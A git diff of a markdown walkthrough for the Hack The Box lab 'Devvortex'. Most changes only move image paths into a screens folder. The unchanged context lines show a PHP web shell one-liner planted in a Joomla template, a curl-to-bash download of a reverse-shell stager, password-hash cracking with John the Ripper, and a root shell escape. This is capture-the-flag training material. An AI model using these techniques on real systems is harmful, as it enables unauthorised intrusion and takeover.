@@ -29,7 +29,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
 
 ## 2. Check 80 port in browser
 
-![plot](./1.png)
+![plot](./screens/1.png)
 
 ## 3. Enumerate directories and files
 
@@ -94,13 +94,13 @@ And we find virtual host dev.devvortex.htb
 
 ## 5. Go to this vhost with browser
 
-![plot](./2.png)
+![plot](./screens/2.png)
 
 We see the some web-app
 
 Try to enumerating this site
 
-![plot](./3.png)
+![plot](./screens/3.png)
 
 Find **/administrator** url. This is Joomla administrator panel.
 
@@ -257,7 +257,7 @@ This vulnerability allows you to dump the Joomla administrator password and save
 
 ## 9. Go to administration panel and sign in
 
-![plot](./4.png)
+![plot](./screens/4.png)
 
 And we went to the admin panel
 
@@ -267,7 +267,7 @@ Search in google exploitation technique for upload web shell in Joomla and find 
 Go to System => Sites Templates =>  Cassiopeia Details and Files
 and click New File
 
-![plot](./5.png)
+![plot](./screens/5.png)
 
 ## 10. Create new php file and write simple php web-shell
 
@@ -275,11 +275,11 @@ and click New File
 <?php system($_GET["cmd"]); ?>
 ```
 
-![plot](./6.png)
+![plot](./screens/6.png)
 
 And later click Save and close
 
-![plot](./7.png)
+![plot](./screens/7.png)
 
 Go to url for our payload ave.php and check command execution.
 We have a webshell access but we need full shell access
@@ -310,7 +310,7 @@ This is necessary to download the shell script with our reverse shell payload.
 Let's intercept the web shell command with a burp and enter a command there to download and launch our reverse shell
 through the curl command with redirecting the output to standard input in the bash interpreter
 
-![plot](./8.png)
+![plot](./screens/8.png)
 
 ```
 
@@ -322,7 +322,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Our stager download to system and execute with bash and we have a shell
 
 
-![plot](./9.png)
+![plot](./screens/9.png)
 
 # Postexploitation and Privilage escalation
 
@@ -330,7 +330,7 @@ Our stager download to system and execute with bash and we have a shell
 
 Go to path joomla database config and finded creds for database
 
-![plot](./10.png)
+![plot](./screens/10.png)
 
 ## 14. Connect to mysql
 
@@ -361,7 +361,7 @@ Copy he hash and save to file john.hash for John the Ripper brutforce attack
 john --wordlist=/usr/share/wordlists/rockyou.txt john.hash 
 
 ```
-![plot](./11.png)
+![plot](./screens/11.png)
 
 We have a password for user logan
 
@@ -402,6 +402,6 @@ press V (view report)
 !/bin/bash
 ```
 
-![plot](./12.png)
+![plot](./screens/12.png)
 
-And we have a root shell!
+And we have a root shell read root.txt!
